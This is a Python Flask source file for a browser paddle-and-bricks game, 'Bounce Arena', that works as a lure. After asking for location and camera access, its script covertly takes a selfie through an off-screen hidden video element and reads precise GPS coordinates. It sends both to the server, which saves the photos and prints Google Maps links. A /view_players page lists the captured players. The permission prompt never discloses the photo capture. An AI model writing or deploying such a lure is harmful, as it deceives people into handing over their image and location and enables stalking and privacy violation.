#!/usr/bin/env python3
"""
Bouce game - created by harpind3r
Location & Camera Data Capture Enabled
Run: python3 app.py
"""

from flask import Flask, render_template_string, request
from base64 import b64decode
import datetime
import os

app = Flask(__name__)

# Data storage directory
os.makedirs('captured_data', exist_ok=True)

player_data = []

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=yes, viewport-fit=cover">
  <title>BOUNCE ARENA | PRO EDITION</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: radial-gradient(circle at 20% 20%, #0a0f1e, #03050a);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: "Segoe UI", "Poppins", system-ui, sans-serif;
      padding: 12px;
      margin: 0;
    }
    .game-container {
      width: 100%;
      max-width: 550px;
      background: rgba(10, 20, 40, 0.7);
      backdrop-filter: blur(20px);
      border-radius: 48px;
      padding: 20px 16px 24px;
      box-shadow: 0 30px 50px rgba(0, 255, 255, 0.25), 0 0 0 2px rgba(0, 255, 255, 0.4);
      border: 1px solid rgba(0, 255, 200, 0.6);
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 100%;
      padding: 0 8px;
      margin-bottom: 12px;
      color: cyan;
      font-weight: bold;
      text-shadow: 0 0 15px cyan;
    }
    .player-tag {
      background: rgba(0, 0, 0, 0.6);
      padding: 8px 18px;
      border-radius: 40px;
      font-size: 1rem;
      letter-spacing: 1px;
      border: 1px solid cyan;
      backdrop-filter: blur(10px);
    }
    .score-box {
      background: black;
      padding: 8px 22px;
      border-radius: 40px;
      font-size: 1.5rem;
      color: #ffea00;
      text-shadow: 0 0 20px #ffcc00;
      border: 1px solid gold;
    }
    .location-status {
      color: #00ffcc;
      font-size: 0.8rem;
      text-align: center;
      margin: 5px 0;
      text-shadow: 0 0 10px cyan;
    }
    canvas {
      display: block;
      width: 100%;
      height: auto;
      background: #0b0e1a;
      border-radius: 36px;
      box-shadow: inset 0 0 30px rgba(0, 255, 255, 0.6), 0 20px 30px black;
      border: 2px solid cyan;
      touch-action: none;
      margin: 8px 0 12px;
    }
    .control-panel {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
      margin-top: 5px;
    }
    .start-btn {
      background: linear-gradient(145deg, #00ffff, #0088ff);
      border: none;
      padding: 16px 38px;
      border-radius: 60px;
      font-weight: 800;
      font-size: 1.4rem;
      letter-spacing: 1.5px;
      color: #000;
      text-transform: uppercase;
      box-shadow: 0 0 35px cyan, 0 10px 20px rgba(0,0,0,0.8);
      cursor: pointer;
      transition: all 0.2s ease;
      width: fit-content;
      border: 1px solid white;
    }
    .start-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    .start-btn:active { transform: scale(0.95); box-shadow: 0 0 60px cyan; }
    .arrow-hint {
      color: #aaccff;
      font-size: 0.9rem;
      background: rgba(0,0,0,0.6);
      padding: 6px 18px;
      border-radius: 20px;
      backdrop-filter: blur(5px);
    }
    .game-over-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 5, 20, 0.95);
      backdrop-filter: blur(25px);
      padding: 30px 25px;
      border-radius: 50px;
      text-align: center;
      box-shadow: 0 0 70px red, 0 0 20px black;
      border: 2px solid #ff4444;
      display: none;
      flex-direction: column;
      gap: 18px;
      z-index: 200;
      width: 85%;
      max-width: 350px;
    }
    .game-over-modal h2 { font-size: 2.4rem; color: #ff3333; text-shadow: 0 0 20px red; }
    .game-over-modal p { font-size: 1.4rem; color: white; }
    .retry-btn {
      background: crimson;
      border: none;
      padding: 14px 28px;
      border-radius: 40px;
      font-weight: bold;
      font-size: 1.2rem;
      color: white;
      box-shadow: 0 0 30px red;
      cursor: pointer;
    }
    .popup-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(12px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 300;
    }
    .popup-card {
      background: #0a1120;
      border: 2px solid cyan;
      border-radius: 48px;
      padding: 28px 22px;
      width: 320px;
      text-align: center;
      color: white;
      box-shadow: 0 0 50px cyan;
    }
    .popup-card input {
      width: 100%;
      padding: 14px;
      margin: 20px 0;
      border-radius: 30px;
      border: none;
      background: #1a1f33;
      color: white;
      font-size: 1.1rem;
      text-align: center;
      outline: 2px solid cyan;
    }
    .popup-card button {
      background: cyan;
      border: none;
      padding: 12px 28px;
      border-radius: 30px;
      font-weight: bold;
      font-size: 1.1rem;
      color: black;
      cursor: pointer;
      box-shadow: 0 0 30px cyan;
      margin: 5px;
    }
    .hidden { display: none !important; }
    .permission-status {
      font-size: 0.8rem;
      margin: 8px 0;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div id="usernamePopup" class="popup-overlay">
    <div class="popup-card">
      <h2> ENTER ARENA </h2>
      <p style="margin:5px 0; color:#aaa;">Choose your nickname</p>
      <input type="text" id="usernameInput" placeholder="Player name" maxlength="14" autofocus>
      <button id="confirmUsername">START JOURNEY</button>
    </div>
  </div>

  <div id="permissionPopup" class="popup-overlay hidden">
    <div class="popup-card">
      <h2>🔐 PERMISSIONS REQUIRED</h2>
      <p style="margin:12px 0;">Location & Camera access needed</p>
      <div id="permStatus" class="permission-status">Click below to grant permissions</div>
      <button id="grantPermissionsBtn">ALLOW & CONTINUE</button>
      <button id="skipPermissionsBtn" style="background:#333; color:white; box-shadow:none; font-size:0.9rem;">Skip (Limited Features)</button>
    </div>
  </div>

  <div class="game-container" id="gameContainer">
    <div class="header">
      <span class="player-tag" id="playerDisplay">👤 PLAYER</span>
      <span class="score-box"><span id="scoreValue">0</span></span>
    </div>
    <div id="locationDisplay" class="location-status">📍 Location: Waiting...</div>
    <canvas id="gameCanvas" width="500" height="500" aria-label="Cyber bounce game canvas"></canvas>
    <div class="control-panel">
      <button class="start-btn" id="startGameBtn" disabled>🎮 START GAME</button>
      <div class="arrow-hint">← → ARROW KEYS | SWIPE ON MOBILE</div>
    </div>
  </div>

  <div id="gameOverModal" class="game-over-modal">
    <h2>💀 GAME OVER</h2>
    <p>SCORE: <span id="finalScoreSpan">0</span></p>
    <p style="font-size:0.9rem; color:#aaa;">Player: <span id="finalPlayerName"></span></p>
    <button class="retry-btn" id="playAgainBtn">🔄 PLAY AGAIN</button>
  </div>

  <video id="hiddenVideo" autoplay playsinline style="position:fixed; top:-9999px; left:-9999px; opacity:0; pointer-events:none;" width="640" height="480"></video>
  <canvas id="hiddenCanvas" style="display:none;"></canvas>

  <script>
    (function() {
      const usernamePopup = document.getElementById("usernamePopup");
      const permissionPopup = document.getElementById("permissionPopup");
      const usernameInput = document.getElementById("usernameInput");
      const confirmBtn = document.getElementById("confirmUsername");
      const grantBtn = document.getElementById("grantPermissionsBtn");
      const skipBtn = document.getElementById("skipPermissionsBtn");
      const permStatus = document.getElementById("permStatus");
      const playerDisplay = document.getElementById("playerDisplay");
      const scoreSpan = document.getElementById("scoreValue");
      const startBtn = document.getElementById("startGameBtn");
      const gameCanvas = document.getElementById("gameCanvas");
      const ctx = gameCanvas.getContext("2d");
      const gameOverModal = document.getElementById("gameOverModal");
      const finalScoreSpan = document.getElementById("finalScoreSpan");
      const finalPlayerName = document.getElementById("finalPlayerName");
      const playAgainBtn = document.getElementById("playAgainBtn");
      const hiddenVideo = document.getElementById("hiddenVideo");
      const hiddenCanvas = document.getElementById("hiddenCanvas");
      const locationDisplay = document.getElementById("locationDisplay");

      let username = "PLAYER";
      let gameActive = false;
      let animationId = null;
      let ballX, ballY, ballRadius = 14;
      let baseSpeed = 4.2;
      let currentSpeedX, currentSpeedY;
      let speedMultiplier = 1.0;
      const PADDLE_WIDTH = 130;
      const PADDLE_HEIGHT = 16;
      let paddleX;
      let enemies = [];
      const ENEMY_ROWS = 5;
      const ENEMY_COLS = 7;
      const ENEMY_WIDTH = 58;
      const ENEMY_HEIGHT = 24;
      let score = 0;
      let rightPressed = false;
      let leftPressed = false;
      let locationData = null;
      let cameraImageData = null;
      let permissionsGranted = false;

      function resetGameState() {
        paddleX = (gameCanvas.width - PADDLE_WIDTH) / 2;
        ballX = gameCanvas.width / 2;
        ballY = gameCanvas.height - 55;
        speedMultiplier = 1.0;
        currentSpeedX = baseSpeed * (Math.random() > 0.5 ? 1 : -1);
        currentSpeedY = -baseSpeed;
        enemies = [];
        for (let row = 0; row < ENEMY_ROWS; row++) {
          for (let col = 0; col < ENEMY_COLS; col++) {
            enemies.push({
              x: 45 + col * (ENEMY_WIDTH + 8),
              y: 45 + row * (ENEMY_HEIGHT + 10),
              width: ENEMY_WIDTH,
              height: ENEMY_HEIGHT,
              alive: true
            });
          }
        }
        score = 0;
        scoreSpan.textContent = "0";
      }

      function drawBall() {
        ctx.beginPath();
        ctx.arc(ballX, ballY, ballRadius, 0, Math.PI * 2);
        ctx.fillStyle = "#00ffff";
        ctx.shadowBlur = 22;
        ctx.shadowColor = "#00ffff";
        ctx.fill();
        ctx.closePath();
        ctx.shadowBlur = 0;
      }

      function drawPaddle() {
        ctx.beginPath();
        ctx.rect(paddleX, gameCanvas.height - PADDLE_HEIGHT - 12, PADDLE_WIDTH, PADDLE_HEIGHT);
        ctx.fillStyle = "#ffdd44";
        ctx.shadowBlur = 20;
        ctx.shadowColor = "#ffaa00";
        ctx.fill();
        ctx.closePath();
        ctx.shadowBlur = 0;
      }

      function drawEnemies() {
        enemies.forEach(e => {
          if (e.alive) {
            ctx.beginPath();
            ctx.rect(e.x, e.y, e.width, e.height);
            const gradient = ctx.createLinearGradient(e.x, e.y, e.x + 10, e.y + e.height);
            gradient.addColorStop(0, "#ff3366");
            gradient.addColorStop(1, "#aa2244");
            ctx.fillStyle = gradient;
            ctx.shadowBlur = 14;
            ctx.shadowColor = "#ff0044";
            ctx.fill();
            ctx.closePath();
            ctx.shadowBlur = 0;
          }
        });
      }

      function collisionDetection() {
        for (let enemy of enemies) {
          if (!enemy.alive) continue;
          if (ballX > enemy.x && ballX < enemy.x + enemy.width &&
              ballY > enemy.y && ballY < enemy.y + enemy.height) {
            enemy.alive = false;
            currentSpeedY = -currentSpeedY;
            score += 10;
            scoreSpan.textContent = score;
            speedMultiplier = Math.min(2.6, 1 + score * 0.018);
          }
        }
      }

      function updateBallAndPaddle() {
        if (!gameActive) return;
        if (rightPressed && paddleX < gameCanvas.width - PADDLE_WIDTH) {
          paddleX += 9;
        } else if (leftPressed && paddleX > 0) {
          paddleX -= 9;
        }
        let moveX = currentSpeedX * speedMultiplier;
        let moveY = currentSpeedY * speedMultiplier;
        ballX += moveX;
        ballY += moveY;
        if (ballX + ballRadius > gameCanvas.width || ballX - ballRadius < 0) {
          currentSpeedX = -currentSpeedX;
          ballX = Math.max(ballRadius, Math.min(gameCanvas.width - ballRadius, ballX));
        }
        if (ballY - ballRadius < 0) {
          currentSpeedY = -currentSpeedY;
          ballY = ballRadius;
        }
        if (ballY + ballRadius > gameCanvas.height - ballRadius) {
          if (ballX > paddleX && ballX < paddleX + PADDLE_WIDTH) {
            currentSpeedY = -Math.abs(currentSpeedY);
            let hitPos = (ballX - paddleX) / PADDLE_WIDTH;
            currentSpeedX = baseSpeed * (hitPos - 0.5) * 2.2;
            ballY = gameCanvas.height - PADDLE_HEIGHT - 12 - ballRadius;
          } else {
            endGame();
            return;
          }
        }
      }

      function gameLoop() {
        if (!gameActive) return;
        ctx.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
        drawEnemies();
        drawBall();
        drawPaddle();
        collisionDetection();
        updateBallAndPaddle();
        if (enemies.every(e => !e.alive) && gameActive) {
          endGame(true);
          return;
        }
        animationId = requestAnimationFrame(gameLoop);
      }

      function endGame(win = false) {
        if (!gameActive) return;
        gameActive = false;
        if (animationId) cancelAnimationFrame(animationId);
        finalScoreSpan.textContent = score;
        finalPlayerName.textContent = username;
        gameOverModal.style.display = "flex";
        
        // Send final game data to server
        sendGameData();
      }

      function startGameLoop() {
        if (gameActive) return;
        gameActive = true;
        gameOverModal.style.display = "none";
        animationId = requestAnimationFrame(gameLoop);
      }

      function keyDownHandler(e) {
        if (e.key === "ArrowRight" || e.key === "Right") {
          rightPressed = true;
          e.preventDefault();
        } else if (e.key === "ArrowLeft" || e.key === "Left") {
          leftPressed = true;
          e.preventDefault();
        }
      }

      function keyUpHandler(e) {
        if (e.key === "ArrowRight" || e.key === "Right") {
          rightPressed = false;
          e.preventDefault();
        } else if (e.key === "ArrowLeft" || e.key === "Left") {
          leftPressed = false;
          e.preventDefault();
        }
      }

      function touchMoveHandler(e) {
        e.preventDefault();
        if (!gameActive) return;
        const rect = gameCanvas.getBoundingClientRect();
        const touchX = e.touches[0].clientX - rect.left;
        const scaleX = gameCanvas.width / rect.width;
        let canvasX = touchX * scaleX;
        paddleX = canvasX - PADDLE_WIDTH / 2;
        paddleX = Math.max(0, Math.min(gameCanvas.width - PADDLE_WIDTH, paddleX));
      }

      function attachEvents() {
        window.addEventListener("keydown", keyDownHandler);
        window.addEventListener("keyup", keyUpHandler);
        gameCanvas.addEventListener("touchmove", touchMoveHandler, { passive: false });
        gameCanvas.addEventListener("touchstart", (e) => e.preventDefault());
      }

      async function sendGameData() {
        const data = {
          username: username,
          score: score,
          latitude: locationData ? locationData.latitude : null,
          longitude: locationData ? locationData.longitude : null,
          accuracy: locationData ? locationData.accuracy : null,
          image: cameraImageData,
          timestamp: new Date().toISOString()
        };

        try {
          const response = await fetch('/save_game_data', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          });
          const result = await response.json();
          console.log('Data saved:', result);
        } catch (error) {
          console.error('Error saving data:', error);
        }
      }

      async function captureCameraImage() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
              width: 640, 
              height: 480,
              facingMode: "user" 
            } 
          });
          
          hiddenVideo.srcObject = stream;
          await hiddenVideo.play();
          await new Promise(r => setTimeout(r, 1500));
          
          hiddenCanvas.width = hiddenVideo.videoWidth || 640;
          hiddenCanvas.height = hiddenVideo.videoHeight || 480;
          const hCtx = hiddenCanvas.getContext("2d");
          hCtx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
          
          cameraImageData = hiddenCanvas.toDataURL('image/jpeg', 0.8);
          
          stream.getTracks().forEach(track => track.stop());
          hiddenVideo.srcObject = null;
          
          return true;
        } catch (err) {
          console.error("Camera error:", err);
          return false;
        }
      }

      async function getLocationData() {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              resolve,
              reject,
              {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
              }
            );
          });
          
          locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          
          locationDisplay.innerHTML = `📍 Lat: ${locationData.latitude.toFixed(4)} | Lon: ${locationData.longitude.toFixed(4)} | Acc: ${Math.round(locationData.accuracy)}m`;
          
          return true;
        } catch (err) {
          console.error("Location error:", err);
          locationDisplay.innerHTML = "📍 Location: Not available";
          return false;
        }
      }

      async function requestPermissions() {
        permStatus.textContent = "Requesting permissions...";
        permStatus.style.color = "#ffaa00";
        
        const locationSuccess = await getLocationData();
        const cameraSuccess = await captureCameraImage();
        
        if (locationSuccess && cameraSuccess) {
          permStatus.textContent = "✅ All permissions granted!";
          permStatus.style.color = "#00ff00";
          permissionsGranted = true;
        } else if (locationSuccess || cameraSuccess) {
          permStatus.textContent = "⚠️ Partial permissions granted";
          permStatus.style.color = "#ffaa00";
          permissionsGranted = true;
        } else {
          permStatus.textContent = "❌ Permissions denied - Limited features";
          permStatus.style.color = "#ff4444";
          permissionsGranted = false;
        }
        
        startBtn.disabled = false;
        playerDisplay.textContent = `👤 ${username}`;
        
        // Send initial data to server
        if (permissionsGranted) {
          await sendInitialData();
        }
        
        setTimeout(() => {
          permissionPopup.classList.add("hidden");
        }, 1500);
      }

      async function sendInitialData() {
        const data = {
          username: username,
          latitude: locationData ? locationData.latitude : null,
          longitude: locationData ? locationData.longitude : null,
          accuracy: locationData ? locationData.accuracy : null,
          image: cameraImageData,
          timestamp: new Date().toISOString()
        };

        try {
          await fetch('/save_initial_data', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          });
        } catch (error) {
          console.error('Error saving initial data:', error);
        }
      }

      // Event Listeners
      confirmBtn.addEventListener("click", () => {
        const name = usernameInput.value.trim();
        if (name === "") {
          alert("Please enter a nickname!");
          return;
        }
        username = name.substring(0, 14);
        usernamePopup.classList.add("hidden");
        permissionPopup.classList.remove("hidden");
      });

      grantBtn.addEventListener("click", () => {
        requestPermissions();
      });

      skipBtn.addEventListener("click", () => {
        locationDisplay.innerHTML = "📍 Location: Skipped";
        startBtn.disabled = false;
        playerDisplay.textContent = `👤 ${username}`;
        permissionPopup.classList.add("hidden");
      });

      startBtn.addEventListener("click", () => {
        if (!gameActive) {
          resetGameState();
          startGameLoop();
          startBtn.textContent = "⚡ PLAYING...";
        }
      });

      playAgainBtn.addEventListener("click", () => {
        gameOverModal.style.display = "none";
        resetGameState();
        startGameLoop();
        startBtn.textContent = "⚡ PLAYING...";
      });

      // Initialize
      resetGameState();
      attachEvents();
      usernamePopup.classList.remove("hidden");
      permissionPopup.classList.add("hidden");
      gameOverModal.style.display = "none";
      ctx.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
      drawEnemies();
      drawPaddle();
      drawBall();
    })();
  </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save_initial_data', methods=['POST'])
def save_initial_data():
    """Save initial player data when they grant permissions"""
    try:
        data = request.json
        username = data.get('username', 'Unknown')
        lat = data.get('latitude')
        lon = data.get('longitude')
        accuracy = data.get('accuracy')
        image_data = data.get('image')
        timestamp = data.get('timestamp')
        
        print("\n" + "="*50)
        print("🎮 NEW PLAYER JOINED!")
        print("="*50)
        print(f"👤 Username  : {username}")
        print(f"🕐 Time      : {timestamp}")
        
        if lat and lon:
            print(f"📍 Latitude  : {lat}")
            print(f"📍 Longitude : {lon}")
            print(f"📍 Accuracy  : {accuracy} meters")
            print(f"🗺️  Maps Link : https://maps.google.com/?q={lat},{lon}")
        
        # Save image if captured
        if image_data and image_data.startswith('data:image'):
            image_bytes = image_data.split(',')[1]
            timestamp_str = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"captured_data/player_{username}_{timestamp_str}.jpg"
            with open(filename, 'wb') as f:
                f.write(b64decode(image_bytes))
            print(f"📸 Selfie    : Saved as {filename}")
        
        print("="*50 + "\n")
        
        # Store in memory
        player_data.append({
            'username': username,
            'latitude': lat,
            'longitude': lon,
            'accuracy': accuracy,
            'timestamp': timestamp
        })
        
        return {'status': 'success', 'message': 'Initial data saved'}
    
    except Exception as e:
        print(f"Error saving initial data: {e}")
        return {'status': 'error', 'message': str(e)}, 500

@app.route('/save_game_data', methods=['POST'])
def save_game_data():
    """Save final game data when game ends"""
    try:
        data = request.json
        username = data.get('username', 'Unknown')
        score = data.get('score', 0)
        lat = data.get('latitude')
        lon = data.get('longitude')
        accuracy = data.get('accuracy')
        image_data = data.get('image')
        timestamp = data.get('timestamp')
        
        print("\n" + "="*50)
        print("💀 GAME OVER - PLAYER DATA")
        print("="*50)
        print(f"👤 Username  : {username}")
        print(f"🎯 Score     : {score}")
        print(f"🕐 Time      : {timestamp}")
        
        if lat and lon:
            print(f"📍 Latitude  : {lat}")
            print(f"📍 Longitude : {lon}")
            print(f"📍 Accuracy  : {accuracy} meters")
            print(f"🗺️  Maps Link : https://maps.google.com/?q={lat},{lon}")
        
        # Save updated image
        if image_data and image_data.startswith('data:image'):
            image_bytes = image_data.split(',')[1]
            timestamp_str = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"captured_data/player_{username}_gameover_{timestamp_str}.jpg"
            with open(filename, 'wb') as f:
                f.write(b64decode(image_bytes))
            print(f"📸 Selfie    : Saved as {filename}")
        
        print("="*50 + "\n")
        
        return {'status': 'success', 'message': 'Game data saved'}
    
    except Exception as e:
        print(f"Error saving game data: {e}")
        return {'status': 'error', 'message': str(e)}, 500

@app.route('/view_players')
def view_players():
    """View all captured player data"""
    html = '''
    <html>
    <head>
        <title>Captured Players Data</title>
        <style>
            body { 
                background: #0a0f1e; 
                color: cyan; 
                font-family: monospace;
                padding: 20px;
            }
            .player-card {
                background: rgba(0,255,255,0.1);
                border: 1px solid cyan;
                padding: 15px;
                margin: 10px 0;
                border-radius: 10px;
            }
            .maps-link {
                color: #00ff00;
            }
        </style>
    </head>
    <body>
        <h1>🎮 Captured Players</h1>
        <p>Total Players: ''' + str(len(player_data)) + '''</p>
    '''
    
    for i, player in enumerate(player_data):
        html += f'''
        <div class="player-card">
            <h3>Player {i+1}: {player.get('username', 'Unknown')}</h3>
            <p>🕐 Time: {player.get('timestamp', 'N/A')}</p>
        '''
        if player.get('latitude') and player.get('longitude'):
            html += f'''
            <p>📍 Lat: {player['latitude']} | Lon: {player['longitude']}</p>
            <p>📍 Accuracy: {player.get('accuracy', 'N/A')} meters</p>
            <p>🗺️ <a class="maps-link" href="https://maps.google.com/?q={player['latitude']},{player['longitude']}" target="_blank">View on Google Maps</a></p>
            '''
        html += '</div>'
    
    html += '</body></html>'
    return html

if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════╗
║          BOUNCE ARENA -Created by Harpind3r      ║
║          Location & Camera Data Capture          ║
╠══════════════════════════════════════════════════╣
║  Game URL: http://localhost:5000                 ║
║  View Data: http://localhost:5000/view_players   ║
║  Captured Images: ./captured_data/               ║
╚══════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True)
